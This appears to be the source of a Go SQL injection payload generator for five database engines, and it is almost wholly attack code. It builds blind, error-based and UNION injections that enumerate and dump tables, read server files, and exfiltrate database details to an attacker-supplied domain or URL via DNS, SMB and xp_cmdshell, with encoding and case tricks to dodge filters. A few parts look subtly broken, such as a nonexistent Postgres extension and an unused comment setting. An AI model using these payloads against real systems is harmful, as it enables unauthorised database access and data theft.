package sqli

import (
	"fmt"
	"math/rand"
	"strings"
)

type PayloadGenerator struct {
	dbms       DBMSType
	columns    int
	totalWidth int
_comment   string
}

func NewPayloadGenerator(dbms DBMSType) *PayloadGenerator {
	pg := &PayloadGenerator{dbms: dbms}
	switch dbms {
	case DBMSMySQL:
		pg._comment = " --"
	case DBMSPostgres:
		pg._comment = " --"
	case DBMSMSSQL:
		pg._comment = " --"
	case DBMSOracle:
		pg._comment = " --"
	case DBMSSQLite:
		pg._comment = " --"
	default:
		pg._comment = " --"
	}
	return pg
}

func (pg *PayloadGenerator) SetColumns(n int) {
	pg.columns = n
}

func (pg *PayloadGenerator) BooleanTrue() string {
	switch pg.dbms {
	case DBMSMySQL:
		return "'1'='1'"
	case DBMSPostgres:
		return "'1'='1'"
	case DBMSMSSQL:
		return "'1'='1'"
	case DBMSOracle:
		return "'1'='1'"
	case DBMSSQLite:
		return "'1'='1'"
	default:
		return "'1'='1'"
	}
}

func (pg *PayloadGenerator) BooleanFalse() string {
	switch pg.dbms {
	case DBMSMySQL:
		return "'1'='2'"
	case DBMSPostgres:
		return "'1'='2'"
	case DBMSMSSQL:
		return "'1'='2'"
	case DBMSOracle:
		return "'1'='2'"
	case DBMSSQLite:
		return "'1'='2'"
	default:
		return "'1'='2'"
	}
}

func (pg *PayloadGenerator) TimeBasedDelay(seconds int) string {
	switch pg.dbms {
	case DBMSMySQL:
		return fmt.Sprintf("' OR SLEEP(%d)--", seconds)
	case DBMSPostgres:
		return fmt.Sprintf("'; SELECT pg_sleep(%d);--", seconds)
	case DBMSMSSQL:
		return fmt.Sprintf("'; WAITFOR DELAY '0:0:%d';--", seconds)
	case DBMSOracle:
		return fmt.Sprintf("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%d);--", seconds)
	case DBMSSQLite:
		return fmt.Sprintf("' AND 1=randomblob(%d00000000);--", seconds)
	default:
		return fmt.Sprintf("' OR SLEEP(%d)--", seconds)
	}
}

func (pg *PayloadGenerator) TimeBasedCommentDelay(seconds int) string {
	switch pg.dbms {
	case DBMSMySQL:
		return fmt.Sprintf("' OR SLEEP(%d)#", seconds)
	case DBMSPostgres:
		return fmt.Sprintf("'; SELECT pg_sleep(%d);--", seconds)
	case DBMSMSSQL:
		return fmt.Sprintf("'; WAITFOR DELAY '0:0:%d';--", seconds)
	case DBMSOracle:
		return fmt.Sprintf("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%d);--", seconds)
	default:
		return fmt.Sprintf("' OR SLEEP(%d)#", seconds)
	}
}

func (pg *PayloadGenerator) ErrorExtractValue(subquery string) string {
	switch pg.dbms {
	case DBMSMySQL:
		return fmt.Sprintf("' AND EXTRACTVALUE(1,CONCAT(0x7e,(%s),0x7e))--", subquery)
	case DBMSPostgres:
		return fmt.Sprintf("' AND 1=CAST((%s) AS INT)--", subquery)
	case DBMSMSSQL:
		return fmt.Sprintf("' AND 1=CONVERT(INT,(%s))--", subquery)
	case DBMSOracle:
		return fmt.Sprintf("' AND 1=CTXSYS.DRITHSX.SN(1,(%s))--", subquery)
	default:
		return fmt.Sprintf("' AND EXTRACTVALUE(1,CONCAT(0x7e,(%s),0x7e))--", subquery)
	}
}

func (pg *PayloadGenerator) ErrorUpdateXML(subquery string) string {
	switch pg.dbms {
	case DBMSMySQL:
		return fmt.Sprintf("' AND UPDATEXML(1,CONCAT(0x7e,(%s),0x7e),1)--", subquery)
	case DBMSPostgres:
		return fmt.Sprintf("' AND 1=CAST((%s) AS INT)--", subquery)
	case DBMSMSSQL:
		return fmt.Sprintf("' AND 1=CONVERT(INT,(%s))--", subquery)
	default:
		return fmt.Sprintf("' AND UPDATEXML(1,CONCAT(0x7e,(%s),0x7e),1)--", subquery)
	}
}

func (pg *PayloadGenerator) UnionSelect(columns int) string {
	if columns <= 0 {
		columns = pg.columns
	}
	vals := make([]string, columns)
	for i := range vals {
		vals[i] = fmt.Sprintf("%d", i+1)
	}
	return fmt.Sprintf("' UNION SELECT %s--", strings.Join(vals, ","))
}

func (pg *PayloadGenerator) UnionSelectNull(columns int) string {
	if columns <= 0 {
		columns = pg.columns
	}
	vals := make([]string, columns)
	for i := range vals {
		vals[i] = "NULL"
	}
	return fmt.Sprintf("' UNION SELECT %s--", strings.Join(vals, ","))
}

func (pg *PayloadGenerator) UnionSelectFrom(columns int, table string) string {
	if columns <= 0 {
		columns = pg.columns
	}
	vals := make([]string, columns)
	for i := range vals {
		vals[i] = fmt.Sprintf("'%d'", i+1)
	}
	return fmt.Sprintf("' UNION SELECT %s FROM %s--", strings.Join(vals, ","), table)
}

func (pg *PayloadGenerator) OrderBy(columns int) string {
	return fmt.Sprintf("' ORDER BY %d--", columns)
}

func (pg *PayloadGenerator) StackedQuery(query string) string {
	return fmt.Sprintf("'; %s--", query)
}

func (pg *PayloadGenerator) CommentBypass() string {
	return "'/**/"
}

func (pg *PayloadGenerator) Version() string {
	switch pg.dbms {
	case DBMSMySQL:
		return "' AND (SELECT version())--"
	case DBMSPostgres:
		return "' AND (SELECT version())--"
	case DBMSMSSQL:
		return "' AND (SELECT @@version)--"
	case DBMSOracle:
		return "' AND (SELECT banner FROM v$version WHERE ROWNUM=1)--"
	case DBMSSQLite:
		return "' AND (SELECT sqlite_version())--"
	default:
		return "' AND (SELECT version())--"
	}
}

func (pg *PayloadGenerator) Database() string {
	switch pg.dbms {
	case DBMSMySQL:
		return "' AND (SELECT database())--"
	case DBMSPostgres:
		return "' AND (SELECT current_database())--"
	case DBMSMSSQL:
		return "' AND (SELECT db_name())--"
	case DBMSOracle:
		return "' AND (SELECT ora_database_name FROM dual)--"
	case DBMSSQLite:
		return "' AND (SELECT name FROM sqlite_master LIMIT 1)--"
	default:
		return "' AND (SELECT database())--"
	}
}

func (pg *PayloadGenerator) User() string {
	switch pg.dbms {
	case DBMSMySQL:
		return "' AND (SELECT user())--"
	case DBMSPostgres:
		return "' AND (SELECT current_user)--"
	case DBMSMSSQL:
		return "' AND (SELECT system_user)--"
	case DBMSOracle:
		return "' AND (SELECT user FROM dual)--"
	case DBMSSQLite:
		return "' AND (SELECT 'sqlite')--"
	default:
		return "' AND (SELECT user())--"
	}
}

func (pg *PayloadGenerator) LoadFile(path string) string {
	switch pg.dbms {
	case DBMSMySQL:
		return fmt.Sprintf("' AND (SELECT LOAD_FILE('%s'))--", path)
	case DBMSPostgres:
		return fmt.Sprintf("' AND (SELECT pg_read_file('%s'))--", path)
	case DBMSMSSQL:
		return fmt.Sprintf("' AND (SELECT OPENROWSET(BULK '%s',SINGLE_CLOB))--", path)
	default:
		return fmt.Sprintf("' AND (SELECT LOAD_FILE('%s'))--", path)
	}
}

func (pg *PayloadGenerator) ListDatabases() string {
	switch pg.dbms {
	case DBMSMySQL:
		return "' UNION SELECT schema_name FROM information_schema.schemata--"
	case DBMSPostgres:
		return "' UNION SELECT datname FROM pg_database--"
	case DBMSMSSQL:
		return "' UNION SELECT name FROM master..sysdatabases--"
	case DBMSOracle:
		return "' UNION SELECT username FROM all_users--"
	case DBMSSQLite:
		return "' UNION SELECT name FROM sqlite_master WHERE type='table'--"
	default:
		return "' UNION SELECT schema_name FROM information_schema.schemata--"
	}
}

func (pg *PayloadGenerator) ListTables(dbname string) string {
	switch pg.dbms {
	case DBMSMySQL:
		return fmt.Sprintf("' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='%s'--", dbname)
	case DBMSPostgres:
		return fmt.Sprintf("' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--")
	case DBMSMSSQL:
		return fmt.Sprintf("' UNION SELECT name FROM %s..sysobjects WHERE xtype='U'--", dbname)
	case DBMSOracle:
		return "' UNION SELECT table_name FROM user_tables--"
	case DBMSSQLite:
		return "' UNION SELECT name FROM sqlite_master WHERE type='table'--"
	default:
		return fmt.Sprintf("' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='%s'--", dbname)
	}
}

func (pg *PayloadGenerator) ListColumns(table string) string {
	switch pg.dbms {
	case DBMSMySQL:
		return fmt.Sprintf("' UNION SELECT column_name FROM information_schema.columns WHERE table_name='%s'--", table)
	case DBMSPostgres:
		return fmt.Sprintf("' UNION SELECT column_name FROM information_schema.columns WHERE table_name='%s'--", table)
	case DBMSMSSQL:
		return fmt.Sprintf("' UNION SELECT name FROM syscolumns WHERE id=OBJECT_ID('%s')--", table)
	case DBMSOracle:
		return fmt.Sprintf("' UNION SELECT column_name FROM user_tab_columns WHERE table_name='%s'--", strings.ToUpper(table))
	case DBMSSQLite:
		return fmt.Sprintf("' UNION SELECT name FROM pragma_table_info('%s')--", table)
	default:
		return fmt.Sprintf("' UNION SELECT column_name FROM information_schema.columns WHERE table_name='%s'--", table)
	}
}

func (pg *PayloadGenerator) DumpTable(table string, columns []string) string {
	colStr := strings.Join(columns, ",")
	switch pg.dbms {
	case DBMSMySQL:
		return fmt.Sprintf("' UNION SELECT %s FROM %s--", colStr, table)
	case DBMSPostgres:
		return fmt.Sprintf("' UNION SELECT %s FROM %s--", colStr, table)
	case DBMSMSSQL:
		return fmt.Sprintf("' UNION SELECT %s FROM %s--", colStr, table)
	case DBMSOracle:
		return fmt.Sprintf("' UNION SELECT %s FROM %s--", colStr, table)
	case DBMSSQLite:
		return fmt.Sprintf("' UNION SELECT %s FROM %s--", colStr, table)
	default:
		return fmt.Sprintf("' UNION SELECT %s FROM %s--", colStr, table)
	}
}

func (pg *PayloadGenerator) OBFDNS(domain string) string {
	tag := randomHex(8)
	switch pg.dbms {
	case DBMSMySQL:
		return fmt.Sprintf("' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.%s.%s\\\\a')))--", tag, domain)
	case DBMSPostgres:
		return fmt.Sprintf("'; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host=%s dbname='||(SELECT version())||' user='||version())--", domain)
	case DBMSMSSQL:
		return fmt.Sprintf("'; EXEC master..xp_dirtree '\\\\%s.%s\\share'--", tag, domain)
	default:
		return fmt.Sprintf("' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.%s.%s\\\\a')))--", tag, domain)
	}
}

func (pg *PayloadGenerator) OOBHTTP(callbackURL string) string {
	switch pg.dbms {
	case DBMSMySQL:
		return fmt.Sprintf("' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.',REPLACE('%s','http://',''),'/a')))--", callbackURL)
	case DBMSPostgres:
		return fmt.Sprintf("'; COPY (SELECT version()) TO '%s/version.txt'--", callbackURL)
	case DBMSMSSQL:
		return fmt.Sprintf("'; EXEC master..xp_fileexist '%s'--", callbackURL)
	default:
		return fmt.Sprintf("' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.',REPLACE('%s','http://',''),'/a')))--", callbackURL)
	}
}

func (pg *PayloadGenerator) OOBICMP(callbackIP string) string {
	switch pg.dbms {
	case DBMSMySQL:
		return fmt.Sprintf("' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.%s\\\\a')))--", callbackIP)
	case DBMSPostgres:
		return fmt.Sprintf("'; CREATE EXTENSION IF NOT EXISTS icmp_utils; SELECT icmp_ping('%s')--", callbackIP)
	case DBMSMSSQL:
		return fmt.Sprintf("'; EXEC xp_cmdshell 'ping %s'--", callbackIP)
	default:
		return fmt.Sprintf("' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.%s\\\\a')))--", callbackIP)
	}
}

func (pg *PayloadGenerator) HexEncode(payload string) string {
	var sb strings.Builder
	for _, b := range []byte(payload) {
		sb.WriteString(fmt.Sprintf("0x%02x", b))
	}
	return sb.String()
}

func (pg *PayloadGenerator) CharEncode(payload string) string {
	chars := make([]string, len(payload))
	for i, b := range []byte(payload) {
		chars[i] = fmt.Sprintf("CHAR(%d)", b)
	}
	return "CONCAT(" + strings.Join(chars, ",") + ")"
}

func (pg *PayloadGenerator) RandomCase(payload string) string {
	result := make([]byte, len(payload))
	for i, b := range []byte(payload) {
		if rand.Intn(2) == 0 {
			if b >= 'a' && b <= 'z' {
				result[i] = b - 32
			} else {
				result[i] = b
			}
		} else {
			if b >= 'A' && b <= 'Z' {
				result[i] = b + 32
			} else {
				result[i] = b
			}
		}
	}
	return string(result)
}

func randomHex(n int) string {
	hex := "0123456789abcdef"
	b := make([]byte, n)
	for i := range b {
		b[i] = hex[rand.Intn(len(hex))]
	}
	return string(b)
}
